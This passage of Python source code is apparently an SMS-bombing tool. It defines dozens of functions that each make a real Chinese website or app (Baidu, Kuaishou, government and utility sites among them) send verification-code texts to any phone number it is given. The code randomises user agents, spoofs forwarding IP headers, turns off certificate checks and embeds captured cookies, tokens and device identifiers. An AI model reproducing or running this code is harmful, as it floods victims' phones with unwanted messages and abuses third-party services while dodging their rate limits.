    h7qBXKr8tBwWvUj3LSzJsKwkIUpmhgfWLcanLwIW8Ol2LF = {'wpcp': '', 'wxSource': 'wx', 'appId': 'wxbfd55a2196642168', 'cv': '3.8.8', 'ci': 'e95cd2e0-ea60-11f0-8cb7-b718e17888fd', 'cp': 'w', 'uid': '', 'type': 1, 'mobile': phone, 'deviceId': 'o2HBJNZBAmbC3ao6M'}
    headers = {'User-Agent': get_random_ua(), 'Referer': 'https://servicewechat.com/wxbfd55a2196642168/186/page-frame.html', 'charset': 'utf-8', 'X-Tuiwen-Token': '', 'uid': '', 'Content-Type': 'application/json'}
    requests.post(url, params=payload2, json=h7qBXKr8tBwWvUj3LSzJsKwkIUpmhgfWLcanLwIW8Ol2LF, headers=headers, timeout=15, verify=(1 == 0))

def bomber_sms_madudu_com_cn(phone):
    url = 'https://sms.madudu.com.cn/api/v1/send_sms'
    h7qBXKr8tBwWvUj3LSzJsKwkIUpmhgfWLcanLwIW8Ol2LF = {'channel_id': 54, 'phone': phone}
    headers = {'User-Agent': get_random_ua(), 'referer': 'https://servicewechat.com/wx3aee08af557777b8/20/page-frame.html', 'charset': 'utf-8', 'Content-Type': 'application/json'}
    requests.post(url, json=h7qBXKr8tBwWvUj3LSzJsKwkIUpmhgfWLcanLwIW8Ol2LF, headers=headers, timeout=15, verify=(1 == 0))

def bomber_jkb_sxjgsw_gov_cn(phone):
    url = 'https://jkb.sxjgsw.gov.cn:8084/Service/userinfo/smscode2'
    data = {'emphone': phone}
    headers = {'User-Agent': get_random_ua(), 'Referer': 'https://servicewechat.com/wxe58649eb4216c254/59/page-frame.html', 'charset': 'utf-8', 'officeZone': '', 'openid': 'o78r74htrgPv_dhRV1yllcgKhjQM', 'Host': 'jkb.sxjgsw.gov.cn:8084'}
    requests.post(url, data=data, headers=headers, timeout=15, verify=False)

def bomber_jdapi_jd100_com(phone):
    url = 'https://jdapi.jd100.com/uc/v1/getSMSCode'
    payload2 = {'time': str(int((time.time() * 1000))), 'use_type': '4', 'sign_type': '1', 'account': phone}
    headers = {'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate, br', 'Referer': 'https://mbpgld.jd100.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Origin': 'https://mbpgld.jd100.com', 'Accept': '*/*', 'content-type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_ua(), 'Connection': 'keep-alive', 'Host': 'jdapi.jd100.com'}
    requests.get(url, params=payload2, headers=headers, timeout=15, verify=(1 == 0))

def bomber_www_9377_com(phone):
    url = 'http://www.9377.com/h5/register.php'
    headers = {'Cookie': 'SESSID=51thqb5me77g9vbisv45l001u7; dwby_ad_dialog=1735738330480', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'http://www.9377.com/', 'Origin': 'http://www.9377.com', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079', 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Connection': 'keep-alive', 'Host': 'www.9377.com'}
    data = {'tel': phone, 'send_captcha': 'sent', 'cellphone': '1', 'do': 'register'}
    requests.post(url, data=data, headers=headers, timeout=15, verify=(1 == 0))

def bomber_api_cf40_com(phone):
    url = 'https://api.cf40.com/api/cf40/h5/sendCode'
    payload = {'codeType': 'phone', 'reqType': 'register', 'login_name': phone}
    headers = {'priority': 'u=1, i', 'accept-language': 'zh,en-US;q=0.9,en;q=0.8', 'referer': 'https://cf40.com/', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'x-requested-with': 'com.cf40.research.android', 'origin': 'https://cf40.com', 'sec-ch-ua-mobile': '?1', 'content-type': 'application/json;charset=UTF-8', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"', 'sec-ch-ua-platform': '"Android"', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36'}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=False)

def bomber_w_chengtakj_com(phone):
    url = 'https://w.chengtakj.com/api/wapp/common/sms'
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'w.chengtakj.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G9910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36', 'Content-Type': 'application/json; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'}
    payload2 = {'type': '1', 'phone': phone}
    requests.get(url, headers=headers, params=payload2, timeout=10, verify=False)

def bomber_cjapp_cjfco_com_cn(phone):
    url = 'https://cjapp.cjfco.com.cn/backend/iu/sms-login/send-sms'
    headers = {'Host': 'cjapp.cjfco.com.cn', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'android14(API34 realme RMX3708)/3.0.2_307(019EACFEE2BA739E91E97A6DF2B79453)'}
    payload = {'mobile': phone, 'clientType': 'android'}
    requests.post(url, headers=headers, json=payload, timeout=10, verify=False)

def bomber_jidaiapi_tianxiangkj_cn(phone):
    url = 'https://jidaiapi.tianxiangkj.cn/jidaiapi/login/phoneCode'
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'jidaiapi.tianxiangkj.cn', 'User-Agent': 'okhttp/3.14.9', 'Content-Type': 'application/json; charset=UTF-8'}
    payload = {'version': '1', 'pkgName': 'weijieqian.qimiaoxiaodai.cn', 'phone': phone, 'oaid': 'E10552ADFAA24BB188C827BB29CEA955abdd8566d7486bb83c891546acd7ef91', 'googleId': '', 'channelId': '4', 'appId': '289', 'androidId': ''}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_a_xrwangluo_com(phone):
    url = 'https://a.xrwangluo.com/code/code'
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'a.xrwangluo.com', 'Content-Type': 'application/x-www-form-urlencoded', 'cookie': 'ctoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aXNpdHMiOjIsImR1aWQiOiJhaWdxTXM3ais0WURBS0lFVXI2VEo2dWgiLCJkaWQiOjUzMzY0MzAxLCJhcHBpZCI6NTM3NTkwMjcsImJyYW5jaCI6ImNvbS5saWdodHBhbG0uZmVucWlhIiwidmVyc2lvbiI6IjcuOS42IiwiY2hhbm5lbCI6IjIwMDAwIiwicGlkIjoiZmVucWkiLCJwZCI6ImZlbnFpIiwiZ3JvdXAiOiJkZWZhdWx0IiwidGFncyI6W10sImxhc3QiOjYzMiwiaW5pdCI6MTc4MTAxNzEzOSwib3MiOiJhbmRyb2lkIiwicXVlcnlfb3MiOiJhbmRyb2lkIiwiYXBwX29zIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiNy45LjYiLCJxdWVyeV92ZXJzaW9uIjoiOC43LjUiLCJhcHBfaW5uZXJfdmVyc2lvbiI6IjEuMC4yIiwieHJfc2lkIjoiU1dwYWFFMXFaM2xaVkUwd1RsUmpNbGx0U1RCYWFscHRUa1JvYVUxSFVtbE5lVWs2TVhkWGVIVjFPbkpOV0RKc05rTnNWWFJpZVZRNFVGQjFXVEZ6V0hwbGNUbDBRUSJ9.alsLd816hHW8_HxX1Xwb5mT3b7pL09RYxvGmF_l2dms; Path=/', 'C-Token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aXNpdHMiOjIsImR1aWQiOiJhaWdxTXM3ais0WURBS0lFVXI2VEo2dWgiLCJkaWQiOjUzMzY0MzAxLCJhcHBpZCI6NTM3NTkwMjcsImJyYW5jaCI6ImNvbS5saWdodHBhbG0uZmVucWlhIiwidmVyc2lvbiI6IjcuOS42IiwiY2hhbm5lbCI6IjIwMDAwIiwicGlkIjoiZmVucWkiLCJwZCI6ImZlbnFpIiwiZ3JvdXAiOiJkZWZhdWx0IiwidGFncyI6W10sImxhc3QiOjYzMiwiaW5pdCI6MTc4MTAxNzEzOSwib3MiOiJhbmRyb2lkIiwicXVlcnlfb3MiOiJhbmRyb2lkIiwiYXBwX29zIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiNy45LjYiLCJxdWVyeV92ZXJzaW9uIjoiOC43LjUiLCJhcHBfaW5uZXJfdmVyc2lvbiI6IjEuMC4yIiwieHJfc2lkIjoiU1dwYWFFMXFaM2xaVkUwd1RsUmpNbGx0U1RCYWFscHRUa1JvYVUxSFVtbE5lVWs2TVhkWGVIVjFPbkpOV0RKc05rTnNWWFJpZVZRNFVGQjFXVEZ6V0hwbGNUbDBRUSJ9.alsLd816hHW8_HxX1Xwb5mT3b7pL09RYxvGmF_l2dms', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; RMX3708 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36'}
    data = {'case': 'login', 'number': phone}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_sdbao_com(phone):
    url = 'https://api.sdbao.com/api/account/v3/verify-code-send'
    tolKz2B174FXyI5XEK0VPcYuIn3w7KNvu1LH2yH59rWxoMce1RMf = str(int((time.time() * 1000)))
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.sdbao.com', 'Content-Type': 'application/json; charset=UTF-8', 'user-agent': '[Wifi;RMX3708;Android;34;1240*2660*560;app_android_oppo;zh]', 'uniqueId': '19f6882bf5abd894', 'platform': '3', 'deviceId': '19f6882bf5abd894', 'channelType': 'app_android_oppo', 'app-id': 'android', 'AuthorizationV2': '', 'appVersion': '3.9.6', 'app-time': tolKz2B174FXyI5XEK0VPcYuIn3w7KNvu1LH2yH59rWxoMce1RMf, 'api-version': '2'}
    payload = {'key': 'REG-CFANPBDE', 'mobile': phone, 'user-agent': '[Wifi;RMX3708;Android;34;1240*2660*560;app_android_oppo;zh]', 'uniqueId': '19f6882bf5abd894', 'platform': '3', 'deviceId': '19f6882bf5abd894', 'channelType': 'app_android_oppo', 'app-id': 'android', 'AuthorizationV2': '', 'appVersion': '3.9.6', 'app-time': tolKz2B174FXyI5XEK0VPcYuIn3w7KNvu1LH2yH59rWxoMce1RMf, 'api-version': '2'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_xiaoxiangyoupin_com(phone):
    url = 'https://api.xiaoxiangyoupin.com/v2/sms/getLoginSmsCode.json'
    data = {'authCodeName': '', 'mobile': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_wechat_todesk_com(phone):
    url = 'https://wechat.todesk.com/api/phone/phonecode'
    data = {'phone': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_wappass_baidu_com(phone):
    url = 'https://wappass.baidu.com/wp/api/login/sms'
    data = {'dv': 'tk0.44914422713025791523953610678@gge0lq7k3YtmzBBH76D4aItHaIsGa1NGzXsOHVAk0lp6hi76JYtmzBBH76D4aItHaIsGa1NGzXsOHVAk0d769i76DYtmzBBH76D4aItHaIsGa1NGzXsOHVAk0~tkLi760YtmzBBH76D4aItHaIsGa1NGzXsOHVAk0PtxFi76KYtmzBBH76D4aItHaIsGa1NGzXsOHVAk0', 'ctype': '', 'countrycode': '', 'vcodestr': '', 'vcodesign': '', 'dialogVerifyCode': '', 'username': phone, 'tt': '1523953619675', 'apiver': 'v3', 'tpl': 'fbuym', 'charset': 'UTF-8', 'staticpage': 'https://icash.baidu.com/static/hiloan/app/static/login/v3Jump.html'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_ggr_jiliguala_com(phone):
    url = 'https://ggr.jiliguala.com/api/user/sms'
    payload2 = {'nonce': '1B3B0C71B5E74FBF8187A31EB4D08752', 'mobile': phone}
    requests.get(url, params=payload2, timeout=10, verify=False)

def bomber_id_kuaishou_com(phone):
    url = 'https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode'
    data = {'countryCode': '+86', 'type': '53', 'phone': phone, 'sid': 'kuaishou.recharge.web'}
    requests.post(url, data=data, timeout=15, verify=(1 == 0))

def bomber_zt_bjgas_com(phone):
    url = 'http://zt.bjgas.com/bjgas-server/c/api/getVerificationCode'
    payload = {'type': 'register', 'mobile': phone}
    headers = {'Content-Type': 'application/json'}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=False)

def bomber_id_app_acfun_cn(phone):
    url = 'https://id.app.acfun.cn/rest/web/sms/send'
    data = {'phone': phone, 'countryCode': '+86', 'type': '39'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    requests.post(url, data=data, headers=headers, timeout=15, verify=False)

def bomber_api_shanxindafy_com(phone):
    url = 'https://api.shanxindafy.com/app-api/client/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone}

    def random_ip():
        return '.'.join((str(random.randint(0, 255)) for _ in range(4)))
    headers = {'X-Real-IP': random_ip(), 'X-Forwarded-For': random_ip(), 'content-type': 'application/json; charset=utf-8', 'vs': 'MS4wLjI=', 'pn': 'Y29tLmhsemp6LndlYWdhd2Vn', 'cyn': '5YWo5Zu9', 'cl': 'T1BQTw==', 'an': '5rW36YeP5oub5YW86IGM', 'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=(1 == 0))

def bomber_caihangzg_cn(phone):
    url = 'https://caihangzg.cn/Mini/User/VerCode'
    payload = {'mobile': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=False)

def bomber_m_ylzhaopin_com(phone):
    url = 'https://m.ylzhaopin.com/Wxapi/Account/getverify'
    data = {'tel': phone}
    headers = {'Cookie': 'PHPSESSID=7a80vl0jmid9t9jslft3cd3ff6', 'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ5cHdhcHAiLCJuYW1lIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsImlhdCI6MTc4MDk3MjU5MCwiZXhwIjoxNzgwOTc5NzkwfQ.TZEai8SNo84fSux8xPQfdgK528KKDCi-8t5dCfFdg3g', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, data=data, headers=headers, timeout=15, verify=(1 == 0))

def bomber_www_job2050_com(phone):
    url = 'https://www.job2050.com/wap/index.php?c=apicloud&a=sendmsgbyreg'
    data = {'phone': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_www_tailgdd_com(phone):
    url = ''.join(['https://www.tailgdd.com/v1/api/app/getCode?phone=', str(phone)])
    headers = {'User-Agent': 'okhttp/4.2.2', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'www.tailgdd.com', 'language': 'zh_CN', 'Forward-Service-Ip': 'localhost', 'Authorization': ''}
    requests.post(url, headers=headers, timeout=10, verify=False)

def bomber_xcontrol_com_cn(phone):
    url = 'https://xcontrol.com.cn/user/api/v1/sendCode'
    payload = {'type': 0, 'lcid': 2052, 'number': phone}
    headers = {'Content-Type': 'application/json;charset=utf-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.9.2'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_hzbzh_com(phone):
    'hzbzh.com 发送验证码（支持任意手机号）'
    url = 'https://www.hzbzh.com/prod-api/auth/app/sms/code'
    data = {'scene': 'login', 'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))
import random

def bomber_app_api_meowhub_cn(phone):
    'meowhub.cn 发送验证码（支持任意手机号）'
    url = 'https://test.app.meowhub.cn/api/app/auth/sms/send'
    payload = {'scene': 'login', 'mobile': phone}
    headers = {'clientid': 'hycollect_app', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_www_mysmp_cn(phone):
    'mysmp.cn 发送验证码（支持任意手机号）'
    url = 'https://www.mysmp.cn/xhaiapi/apiservice/auth/sendAuthCode'
    payload = {'type': '1', 'mobile': phone}
    headers = {'Authorization': '', 'apiInfo': '{"appId":"1","brand":"luoyue","buildVersion":"1","channel":"4","model":"PJE110","osInfo":"","phone":"","plat":"android","platformCode":"android","version":"1.0.0","userId":0}', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp-okgo/jeasonlzy'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_rcpass_com(phone):
    'rcpass.com 发送验证码（支持任意手机号）'
    url = 'https://rcpass.com/api/user/sendValidateCode'
    payload2 = {'type': 'login', 'cellphone': phone, 'nationCode': '86'}
    headers = {'access-control-allow-origin': '*', 'content-type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.4 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_admin_esjiekeiot_com(phone):
    'esjiekeiot.com 发送验证码（支持任意手机号）'
    url = 'https://admin.esjiekeiot.com/api/wanlshop/sms/send'
    payload2 = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'Accept-Language': 'zh-CN,zh;q=0.9', 'device-type': 'OnePlus', 'App-imei': '', 'App-client': 'Android', 'App-version': '3.0.2', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_habit_api_jielema_cc(phone):
    'jielema.cc 发送验证码（支持任意手机号）'
    url = 'https://habit-api.jielema.cc/auth/request-code'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_fanshu1_com(phone):
    'fanshu1.com 发送验证码（支持任意手机号）'
    url = 'https://fanshu1.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'login'}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_api_fengchaojianzhi_com(phone):
    'fengchaojianzhi.com 发送验证码（支持任意手机号）'
    url = 'https://app-api.fengchaojianzhi.com/user/auth/sms/send'
    payload = {'channel': 'android', 'type': 'login', 'phone': phone}
    headers = {'x-platform': 'app', 'x-language': 'zh_CN', 'x-dev-model': 'PJE110', 'x-app-version': '1.4.3', 'x-trace-id': '3daf913c-3d88-4858-b710-ada3d5d41c24', 'x-dev-network': 'wifi', 'x-device-id': '114695049b2dbc067822c251105876b5', 'x-channel': 'oppo', 'x-android-id': 'b8ba6e49559d2379', 'x-pkg-sc': 'oppo', 'x-timezone': '+08:00', 'x-app-platform': '98', 'x-dev-name': 'OnePlus PJE110', 'x-oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'x-os-type': 'android', 'x-os-version': '16', 'x-dev-brand': 'oneplus', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'com.lgb.jqjc/1.4.3 (Android 36; PJE110_16.0.3.500(CN01); build:27) oem/OnePlus model/PJE110 screen/1080*2376/3.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_gdcaiyanshe_cn(phone):
    'gdcaiyanshe.cn 发送验证码（支持任意手机号）'
    url = 'https://api.gdcaiyanshe.cn/api/v2/users/send-phone-code'
    payload = {'phone': phone, 'type': 'register'}
    headers = {'Authorization': 'Bearer', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_agrivoice_gcjxboss_com(phone):
    'agrivoice.gcjxboss.com 发送验证码（支持任意手机号）'
    url = 'https://agrivoice.gcjxboss.com/api/v1/auth/send-sms'
    payload = {'phone': phone, 'scene': 'login'}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_jxt_jiuxiaotou_com(phone):
    'jiuxiaotou.com 发送验证码（支持任意手机号）'
    url = 'https://jxt.jiuxiaotou.com/api/auth/send-code'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_zl6lz_com(phone):
    'zl6lz.com 发送验证码（支持任意手机号，签名不变）'
    url = 'http://app.zl6lz.com//appapi/'
    payload2 = {'country_code': '86', 'sign': 'a3303c96490afe096369b9b4161d382d', 'mobile': phone, 'imei': '5c2dc226e49dbe35', 'system': '16', 'model': 'PJE110', 'version': '1.0.4', 'service': 'Login.getCode'}
    headers = {'Cookie': 'PHPSESSID=1d0g307tfrtf91609unh52a9ku', 'X-YD-Req-Token': '1781109991|LmjxgY8R2zoV|dbaa4f92ce17e5586052cb89d0b5a5a4', 'X-App-Id': 'lrc_app_2026_001', 'X-Nonce': 'f3cebb48-759c-492b-834d-11ba6e179f72-8152626', 'timestamp': '1781109691', 'X-Signature': '7f4dc1c10eb0a7b63be13f1fd737f53a6da191c21b2c4dae1473280a044416b7', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp-okgo/jeasonlzy'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_app_swee9_icu(phone):
    url = 'https://app.swee9.icu//api/passport/send_code'
    payload = {'mobile': phone, 'type': 'login'}
    headers = {'sign': 'a1da6f9ab0dd7dfbf2e70c814f5f9f70', 'random': '16845', 'timestamp': '1781109153480', 'oaid': '', 'theme': 'vqu-white', 'network-status': 'wifi', 'uuid': '832de281ab438d71', 'package-name': 'com.icu.swee.nianhe', 'channel': '4', 'version': '2.0.11', 'phone-brand': 'PJE110', 'token': '', 'ver-code': '2011', 'source-id': '1', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.9.1'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_ai_entity_cremomo_cn(phone):
    'cremomo.cn 发送验证码（手机号自动 Base64 编码）'
    url = 'https://ai-entity.cremomo.cn/user/send_code'
    lclmTmb23NsrMNDeILs8EyZAvLaRv0PStuU4yiowa = base64.b64encode(phone.encode()).decode()
    payload2 = {'version_code': '1.0.0.1', 'channel': '413415', 'firm': 'OnePlus', 'mode': 'PJE110', 'os_version': '16', 'platform': 'android'}
    payload = {'product_name': 'CreMoMo', 'phone': lclmTmb23NsrMNDeILs8EyZAvLaRv0PStuU4yiowa, 'itu_code': '+86'}
    headers = {'accept-language': 'zh-CN', 'timezone': '480', 'timezone-name': 'Asia/Shanghai', 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/4.8.0'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_tx_huidoutx_com(phone):
    'huidoutx.com 发送验证码（支持任意手机号）'
    url = 'https://tx.huidoutx.com/shop-mall/common/sms/send'
    payload2 = {'mobileNo': phone}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'AuthorizationType': '2', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_app_bridge_chinese_cn(phone):
    url = 'http://app-bridge.chinese.cn/chineseplus-api/bridge/api/v1/send-sms-code'
    payload = {'code_type': 'register', 'region_code': 'CN', 'mobile': phone}
    headers = {'app-token': '', 'Authorization': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_prod_qianbi_cool(phone):
    'qianbi.cool 发送验证码（支持任意手机号）'
    url = 'https://api-prod.qianbi.cool/app/auth/sendSmsCode'
    payload = {'phoneNumber': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_kuochat_cn(phone):
    'kuochat.cn 发送验证码（支持任意手机号）'
    url = 'https://api.kuochat.cn/api/users/verification-code'
    payload = {'phoneNumber': phone}
    headers = {'x-device-info': '{"deviceName":"","os":"","appVersion":"1.1.2+1"}', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'Dart/3.11 (dart:io)'}
